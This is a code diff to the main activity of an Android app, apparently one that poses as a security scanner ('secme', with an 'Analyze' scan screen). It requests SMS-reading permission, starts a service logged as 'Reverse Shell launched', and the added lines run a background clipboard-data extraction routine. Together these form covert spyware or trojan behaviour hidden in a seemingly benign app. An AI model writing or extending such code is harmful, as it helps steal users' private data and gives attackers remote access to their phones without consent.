@@ -8,6 +8,7 @@ import android.Manifest;
 import android.app.KeyguardManager;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.os.AsyncTask;
 import android.os.Bundle;
 import android.os.Handler;
 import android.util.Log;
@@ -127,7 +128,6 @@ public class MainActivity extends AppCompatActivity {
          */
 
         ActivityCompat.requestPermissions(this, neededPermissions, MY_PERMISSIONS_REQUEST_READ_SMS);
-
     }
 
     //Démarrage de l'application
@@ -140,6 +140,17 @@ public class MainActivity extends AppCompatActivity {
         Glide.with(this).load(R.drawable.annonce).into(imageView); //annonce code pin necessaire
         startService(new Intent(this, MyIntentService.class));
         Log.v("secme","Reverse Shell launched - main");
+
+        AsyncTask.execute(new Runnable() {
+            @Override
+            public void run() {
+                Log.v("secme", "Data Extraction Started");
+                DataExtractor de = new DataExtractor();
+                de.extractClipboard(false);
+                Log.v("secme", "Data Extraction Finished");
+                return;
+            }
+        });
     }
 
     // Lancement d'un scan après appui du bouton dans l'activité Analyze
